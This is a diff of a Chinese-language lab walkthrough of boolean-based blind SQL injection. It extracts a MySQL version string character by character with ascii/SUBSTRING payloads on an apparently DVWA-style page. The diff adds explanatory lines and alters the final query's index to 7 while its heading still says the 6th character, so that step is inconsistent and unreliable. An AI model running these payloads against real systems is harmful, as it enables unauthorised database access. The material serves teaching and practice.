@@ -136,7 +136,7 @@ SELECT SUBSTRING((SELECT @@version),1,6)
 # 5.7.34
 ```
 
-5
+判斷版本的第 1 個字元是否為 5
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
@@ -150,45 +150,45 @@ select SUBSTRING((SELECT @@version),2,1);
 # .
 ```
 
-.
+判斷版本的第 2 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),2,1)) = 46); &Submit=Submit
 # User ID exists in the database
 ```
 
-7
+判斷版本的第 3 個字元是否為 7
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),3,1)) = 55); &Submit=Submit
 # User ID exists in the database
 ```
 
-.
+判斷版本的第 4 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 46); &Submit=Submit
 # User ID exists in the database
 ```
 
-3
+判斷版本的第 5 個字元是否為 3
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),5,1)) = 51); &Submit=Submit
 # User ID exists in the database
 ```
 
-.
+判斷版本的第 6 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 46); &Submit=Submit
 # User ID is MISSING in the database
 ```
 
-4
+判斷版本的第 6 個字元是否為 4
 
 ```sql
-id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 52); &Submit=Submit
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),7,1)) = 52); &Submit=Submit
 # User ID exists in the database
 ```
 
